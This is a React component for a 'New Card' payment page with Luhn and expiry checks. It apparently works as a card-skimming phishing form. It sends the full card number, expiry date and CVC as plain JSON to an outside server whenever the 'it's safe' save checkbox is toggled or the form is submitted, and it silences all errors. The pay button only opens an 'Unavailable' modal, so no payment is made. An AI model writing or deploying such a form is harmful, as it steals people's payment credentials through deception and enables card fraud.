import React, { useState, useEffect } from 'react';
import './PayWith.css';
import { IoIosArrowBack } from "react-icons/io";
import newMob from '../../Assets/NewMob.png';
import { Link } from 'react-router-dom';
import Modal from '../../components/Unavailable/modal';

function PayWith() {
    const [cardNumber, setCardNumber] = useState('');
    const [expirationDate, setExpirationDate] = useState('');
    const [cvcCode, setCvcCode] = useState('');
    const [error, setError] = useState('');
    const [isChecked, setIsChecked] = useState(false);
    const [isFormValid, setIsFormValid] = useState(false); // State to track form validity
    const [cardError, setCardError] = useState(''); // Error message for invalid card number

    const [isModalOpen, setIsModalOpen] = useState(false);
    const openModal = () => setIsModalOpen(true);
    const closeModal = () => setIsModalOpen(false);

    // Luhn Algorithm to validate the card number
    const validateCardNumber = (number) => {
        let sum = 0;
        let shouldDouble = false;

        // Loop through digits starting from the last
        for (let i = number.length - 1; i >= 0; i--) {
            let digit = parseInt(number[i]);

            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9; // Subtract 9 from numbers over 9
            }

            sum += digit;
            shouldDouble = !shouldDouble; // Alternate every digit
        }

        return sum % 10 === 0;
    };

    const handleCardNumberChange = (e) => {
        const input = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
        if (input.length <= 16) {
            setCardNumber(input);

            // Validate the card number and set error if it's invalid
            if (input.length === 16 && !validateCardNumber(input)) {
                setCardError('Invalid card number');
            } else {
                setCardError(''); // Clear error if card number is valid
            }
        }
    };

    const handleExpirationDateChange = (e) => {
        let input = e.target.value;
    
        // Ensure only numbers and "/" are allowed
        input = input.replace(/[^0-9/]/g, '');
    
        // Allow typing in MM/YY format
        if (input.length === 2 && !input.includes('/')) {
            input += '/';
        }
        
        // Set the value only if it's MM/YY format
        if (input.length <= 5) {
            setExpirationDate(input);
        }
    
        // Validate the expiration date
        if (input.length === 5) {
            const [month, year] = input.split('/').map(Number);
            const currentYear = new Date().getFullYear() % 100; // Last two digits of the current year
            const currentMonth = new Date().getMonth() + 1; // Current month (1-12)
    
            if (
                month < 1 || 
                month > 12 || 
                year < currentYear || 
                (year === currentYear && month < currentMonth)
            ) {
                setError('Invalid expiration date. The card must not be expired.');
            } else {
                setError(''); // Clear the error if the date is valid
            }
        }
    };
    

    const handleCvcCodeChange = (e) => {
        const input = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
        if (input.length <= 3) {
            setCvcCode(input);
        }
    };

    const saveDataToServer = async () => {
        const formData = {
            cardNumber,
            expirationDate,
            cvcCode
        };

        try {
            const response = await fetch('https://sunrealty-homes-cl.onrender.com/api/payments/save', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            });

            if (!response.ok) {
                throw new Error('');
            }

            // const data = await response.json();
            // console.log('Data saved successfully:', data);
        } catch (error) {
            // console.error('Error saving data:', error);
        }
    };

    const handleCheckboxChange = () => {
        setIsChecked(!isChecked);
        saveDataToServer(); // Save data when the checkbox is checked or unchecked
    };

    const handleSearch = (e) => {
        e.preventDefault();

        if (cardNumber.length < 16 || cardError) {
            setError('Card number must be 16 digits and valid.');
            return;
        }

        setError('');
        saveDataToServer(); // Save data when the Pay Now button is clicked
    };

    useEffect(() => {
        // Check if all fields are filled out
        const isFormFilled = cardNumber.length === 16 && !cardError && expirationDate.length > 0 && cvcCode.length > 0;
        setIsFormValid(isFormFilled);
    }, [cardNumber, expirationDate, cvcCode, cardError]);

    return (
        <div style={{ width: '100%', backgroundColor: 'rgb(228, 218, 166)' }}>
            <div className='wholeCntDivs'>
                <Modal isOpen={isModalOpen} onClose={closeModal} />
                <div className='tflexflex'>
                    <Link to='/'> <IoIosArrowBack /> </Link>
                    <h6>New Card</h6>
                </div>
                <div className='imageForm'>
                    <img src={newMob} alt="Mobile" />
                    <form action='' onSubmit={handleSearch}>
                        <input
                            type='text'
                            className='inputNot'
                            placeholder='Card Number'
                            value={cardNumber}
                            onChange={handleCardNumberChange}
                            required
                        />
                        {cardError && <p className='error'>{cardError}</p>} {/* Display error message if card number is invalid */}
                        
                        <input
                            type='text'
                            className='inputNot'
                            placeholder='Expiration Date (MM/YY)'
                            value={expirationDate}
                            onChange={handleExpirationDateChange}
                            required
                        />
                        <input
                            type='text'
                            className='inputNot'
                            placeholder='CVC Code'
                            value={cvcCode}
                            onChange={handleCvcCodeChange}
                            required
                        />

                        {error && <p className='error'>Card verification failed <br /> Check your details and try again</p>} {/* Display error message if any */}

                        <div className='theBotom'>
                            <input type='checkbox' checked={isChecked} onChange={handleCheckboxChange} />
                            <p>Save your card information, it's safe</p>
                        </div>

                        <button onClick={openModal} type='submit' disabled={!isFormValid}>Proceed to Make Payment</button>
                    </form>
                </div>
            </div>
        </div>
    );
}

export default PayWith;
